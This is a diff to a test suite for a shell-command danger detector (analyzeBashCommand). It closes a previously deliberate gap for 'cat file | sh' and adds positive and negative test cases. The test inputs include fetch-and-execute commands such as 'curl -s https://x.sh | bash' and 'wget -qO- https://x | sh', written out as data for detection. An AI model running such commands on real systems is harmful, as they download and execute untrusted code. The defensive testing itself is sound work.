@@ -159,9 +159,19 @@ describe("stdin/pipes", () => {
   test("curl | bash", () => expect(analyzeBashCommand("curl -s https://x.sh | bash").isDangerous).toBe(true));
   test("wget -qO- | sh -s -- arg", () => expect(analyzeBashCommand("wget -qO- https://x | sh -s -- arg").isDangerous).toBe(true));
   test("curl | sudo bash", () => expect(analyzeBashCommand("curl -s https://x | sudo bash").isDangerous).toBe(true));
-  test("cat local.sh | sh — hueco deliberado (caracterización)", () => {
-    expect(analyzeBashCommand("cat local.sh | sh").isDangerous).toBe(false);
+  test("cat local.sh | sh — hueco cerrado (verificación)", () => {
+    expect(analyzeBashCommand("cat local.sh | sh").isDangerous).toBe(true);
   });
+  test("cat script | bash", () =>
+    expect(analyzeBashCommand("cat script | bash").isDangerous).toBe(true));
+  test("cat data | sudo sh", () =>
+    expect(analyzeBashCommand("cat data | sudo sh").isDangerous).toBe(true));
+  test("cat data | sh -s -- arg", () =>
+    expect(analyzeBashCommand("cat data | sh -s -- arg").isDangerous).toBe(true));
+  test("grep foo | sh — filtro legítimo, NO dispara", () =>
+    expect(analyzeBashCommand("grep foo | sh").isDangerous).toBe(false));
+  test("echo x | sh — pipe inofensivo a shell, NO dispara (no es cat de archivo)", () =>
+    expect(analyzeBashCommand("echo x | sh").isDangerous).toBe(false));
 });
 
 describe("encadenados multisegmento", () => {
